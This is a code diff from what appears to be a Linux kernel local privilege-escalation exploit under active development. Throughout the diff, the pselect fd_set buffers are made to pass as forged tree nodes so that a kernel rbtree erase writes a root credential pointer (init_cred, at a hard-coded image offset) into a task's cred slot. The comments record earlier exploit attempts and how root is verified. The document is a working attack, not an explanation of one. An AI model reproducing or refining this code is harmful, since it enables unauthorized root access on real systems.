@@ -1001,6 +1001,35 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
               goto stack_words_done;
             }
             if (g_resurge_stage == 0) {
+            if (env_flag("MODE4_CRED_PI", 0)) {
+              /* PI-STORE ROOT FIRE: main tree all-zero (fire-6 proven
+               * pure-unlink shape); the pi-tree erase alone stores:
+               *   *slot = cred_copy (Image-verbatim root cred, clean
+               *            aligned pointer)
+               * pi rebalance: sibling = *(cc+8)=0 -> NULL case; up-walk
+               * cc -> usage(=&zeroed slot) -> *(Z)=0 -> terminates.
+               * change_child corrupts only cc+8 (our page).
+               * Parent verifies via /proc/<child>/status; child makes
+               * ZERO syscalls (security field unknown at rest). */
+              uint64_t ztgt = (uint64_t)pselect_write_target();
+              uint64_t ic_off_pi =
+                  (active_offsets && active_offsets->off_init_cred)
+                      ? (uint64_t)active_offsets->off_init_cred
+                      : 0x027E0BE0ULL;
+              uint64_t val_pi = g_cred_copy
+                                     ? (uint64_t)g_cred_copy
+                                     : (uint64_t)data_addr(KIMAGE_TEXT_BASE +
+                                                           ic_off_pi);
+              tree_pc = 0;
+              tree_r = 0;
+              tree_l = 0;
+              pi_parent = val_pi;
+              pi_right = 0;
+              pi_left = ztgt;
+              pr_info("stack CRED_PI: pi *%016llx = %016llx main=0\n",
+                      (unsigned long long)ztgt,
+                      (unsigned long long)val_pi);
+            } else {
             /*
              * *task.cred = init_cred.
              * Default (09-12): park-class only-left PLAIN-STORE
@@ -1027,23 +1056,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                   (active_offsets && active_offsets->off_init_task)
                       ? (uint64_t)active_offsets->off_init_task
                       : (uint64_t)INIT_TASK_OFF;
-              if (env_flag("MODE4_CRED_PI", 0)) {
-                /* PI-STORE ROOT FIRE: main tree all-zero (fire-6 proven
-                 * pure-unlink shape); the pi-tree erase alone stores:
-                 *   *slot = cred_copy (Image-verbatim root cred, clean
-                 *            aligned pointer)
-                 * pi rebalance: sibling = *(cc+8)=0 -> NULL case; up-walk
-                 * cc -> usage(=&zeroed slot) -> *(Z)=0 -> terminates.
-                 * change_child corrupts only cc+8 (our page).
-                 * The parent verifies via /proc/<child>/status — the
-                 * child makes ZERO syscalls (security field unknown). */
-                tree_pc = 0;
-                tree_r = 0;
-                tree_l = 0;
-                pi_parent = val;
-                pi_right = 0;
-                pi_left = ztgt;
-              } else if (env_flag("MODE4_DUALWRITE", 0)) {
+              if (env_flag("MODE4_DUALWRITE", 0)) {
                 /* 09-13 canary proof: 0x780 direct stores NEVER land
                  * (vendor-protected subjective cred) but the erase's
                  * SECOND store (__rb_change_child writes the child
@@ -1109,6 +1122,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                       (unsigned long long)tree_r,
                       (unsigned long long)tree_l);
             }
+            } /* CRED_PI else */
             } /* resurge_stage==0 guard */
           } else if (env_flag("MODE4_SLIDE_ZERO", 0)) {
             /*
@@ -1835,10 +1849,16 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                   (unsigned long long)tree_pc,
                   (unsigned long long)tree_r);
         }
+        pr_info("LAYOUT=COMPACT emit pi_parent=%016llx pi_left=%016llx wps=%d X",
+                (unsigned long long)pi_parent,
+                (unsigned long long)pi_left, words_per_set);
         goto stack_words_done;
       } else if (pselect_custom_write_enabled() &&
                  !env_flag("MODE4_DATAONLY", 0)) {
         stack_task = fake_task;
+        pr_info("LAYOUT=LEGACY emit pi_parent=%016llx pi_left=%016llx wps=%d X",
+                (unsigned long long)pi_parent,
+                (unsigned long long)pi_left, words_per_set);
       }
       struct pselect_waiter_word words[] = {
         {2, 0, "tree_pc"},
